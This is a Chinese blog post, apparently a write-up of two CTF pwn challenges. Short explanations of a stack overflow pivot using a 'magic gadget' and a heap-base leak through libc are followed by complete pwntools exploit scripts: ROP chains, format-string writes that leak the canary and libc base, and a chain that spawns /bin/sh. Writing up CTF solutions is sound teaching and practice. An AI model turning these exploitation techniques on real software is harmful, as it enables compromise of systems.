---
title: WriteUp - 不知道能不能说的一个比赛 - PWN
date: 2024-07-18 23:14:55
draft: false
tags:
  - WriteUp
  - PWN
---
> [!info] 
> 趁着午休的间隙看了一下题，感觉还挺有趣的，~~没有想象中那么粗制滥造~~，有一些思路可以记录一下。

- 附件链接：[github:AvavaAYA/ctf-writeup-collection](https://github.com/AvavaAYA/ctf-writeup-collection/tree/main/Plan-BC-2024)

## pwn1

这道题有一些东拼西凑的感觉，有趣的点在于栈上溢出的数量非常有限，只能改写到返回地址，同时 gadget 也很少，没有控制 rsi、rdx 的能力。

一开始我是想：程序开始的时候读了一些东西到 .bss 段上，那就栈迁移过去让 ROP 链接上，但是发现栈迁移过去后 puts 函数无法正常调用 - 因为栈太浅了，这条路也就断了。

> [!NOTE]
> 在公司里没有 ida，愣是花了半天才发现存在一个 `magic_gadget`，主要是两个功能：
> 1. 造成栈错位的现象，最终 rbp 位于栈顶指针 rsp 上面
> 2. 最终返回到最初 rbp 的地址

上述能力提供了获取输入时修改下个被调用函数（这里是 read）返回地址的能力，因此就可以构造更长的 ROP 链。

最后还要在堆上找到 flag 内容，这里考虑 libc 中 `mp_` 的 `sbrk_base` 域，会指向堆地址的开头：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

magic_gadget = 0x40172F
# .text:000000000040172F                 endbr64
# .text:0000000000401733                 push    rbp
# .text:0000000000401734                 mov     rbp, rsp
# .text:0000000000401737                 push    rbp
# .text:0000000000401738                 mov     rbp, rsp
# .text:000000000040173B                 pop     rdi
# .text:000000000040173C                 retn
pop_rbp_ret = 0x40173E
pop_rdi_ret = 0x000000000040173B


import base64

s(base64.b64decode("SV9jYW5fZmluZF90aGVfcmlnaHRfcGF0aAoK"))
ru(b"===welcome===\n")

payload = flat(
    {
        0x30: [
            0x401712,
            magic_gadget,
        ]
    },
    filler=b"\x00",
)
s(payload)

debugB()
payload = flat(
    {
        0x8: [
            pop_rdi_ret,
            elf.got.puts,
            elf.plt.puts,
            0x401712,
        ]
    }
)
s(payload)
libc_base = u64_ex(ru(b"\n", drop=True)) - libc.sym.puts
lg("libc_base", libc_base)

debugB()
payload = flat(
    {
        0x30: [
            0x401712,
            magic_gadget,
        ]
    },
    filler=b"\x00",
)
s(payload)

debugB()
payload = flat(
    {
        0x8: [
            pop_rdi_ret,
            # libc_base + libc.sym.mp_ + 96,
            libc_base + 0x21A360 + 96 + 1,
            elf.plt.puts,
            0x401712,
        ]
    }
)
s(payload)
heap_base = u64_ex(ru(b"\n", drop=True)) << 0x8
lg("heap_base", heap_base)
flag_addr = heap_base + 0x2D0

debugB()
payload = flat(
    {
        0x30: [
            0x401712,
            magic_gadget,
        ]
    },
    filler=b"\x00",
)
s(payload)

debugB()
payload = flat(
    {
        0x8: [
            pop_rdi_ret,
            flag_addr,
            elf.plt.puts,
            0,
        ]
    }
)
s(payload)

ia()
```

---
## pwn2

> [!todo] 
> 下班再写

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

ru(b"Input your name size: \n")
sl(i2b(0x80))
ru(b"Input your name: \n")
s(b"a" * 0x80)

ru(b"a" * 0x80)
stack_base = u64_ex(ru(b"Now you have one time to change your name.\n", drop=True))
lg("stack_base", stack_base)

fmt = strFmt()

payload = fmt.generate_hhn_payload(0x78 + 0x10, 0x14)
payload += fmt.generate_hhn_payload(0x70 + 0x10, 0xFF)

guess_bit0 = 0x8
payload += fmt.generate_hhn_payload(0x68 + 0x10, (guess_bit0 << 4) | 0)
payload = payload.ljust(0x68, b"\x00")
payload += flat([stack_base - 0xAF, stack_base - 0x183, stack_base - 0x198])
s(payload)

sl(b"a")

fmt = strFmt()

guess_bit1 = 0x2
payload = fmt.generate_hhn_payload(0x78 + 0x10, 0x14)
payload += fmt.generate_hn_payload(0xE0, (guess_bit1 << 12) | 0x5C0)
payload = payload.ljust(0x78, b"\x00")
payload += flat([stack_base - 0x198])
sl(payload)

fmt = strFmt()

payload = fmt.generate_hhn_payload(0x78 + 0x10, 0x14)
payload += (
    b".%"
    + i2b(0x98 // 8 + 6)
    + b"$p.%"
    + i2b(0xA8 // 8 + 6)
    + b"$p.%"
    + i2b(0xC8 // 8 + 6)
    + b"$p."
)
payload = payload.ljust(0x78, b"\x00")
payload += flat([stack_base - 0x198])
sl(payload)
sl(payload)
ru(b"Now you have one time to change your name.\n")
ru(b".")
canary = int(ru(b".", drop=True), 16)
libc_base = int(ru(b".", drop=True), 16) - 0x240B3
elf_base = int(ru(b".", drop=True), 16) - 0x168D

pop_rdi_ret = libc_base + 0x0000000000023B72
pop_rsi_ret = libc_base + 0x000000000002604F
get_rax = (
    libc_base + 0x000000000005B652
)  # mov rdi, rax; cmp rdx, rcx; jae 0x5b63c; mov rax, r8; ret;
pop_rdx_2_ret = libc_base + 0x0000000000119241
pop_rcx_2_ret = libc_base + 0x00000000001025AE

# payload = flat(
#     {
#         0x00: b"flag\x00",
#         0x88: [
#             canary,
#             0xDEADBEEF,
#             pop_rdi_ret,
#             stack_base - 0x180,
#             pop_rsi_ret,
#             0,
#             libc_base + libc.sym.open,
#             pop_rdx_2_ret,
#             0x100,
#             0,
#             pop_rcx_2_ret,
#             0x200,
#             0,
#             get_rax,
#             pop_rsi_ret,
#             stack_base,
#             libc_base + libc.sym.read,
#             pop_rdi_ret,
#             2,
#             libc_base + libc.sym.write,
#         ],
#     }
# )
payload = flat(
    {
        0x88: [
            canary,
            0xDEADBEEF,
            pop_rdi_ret + 1,
            pop_rdi_ret,
            libc_base + next(libc.search(b"/bin/sh\x00")),
            libc_base + libc.sym.system,
        ],
    }
)
sl(b"\x00")
sl(payload)

sl(b"cat flag 1>&2")

ia()
```
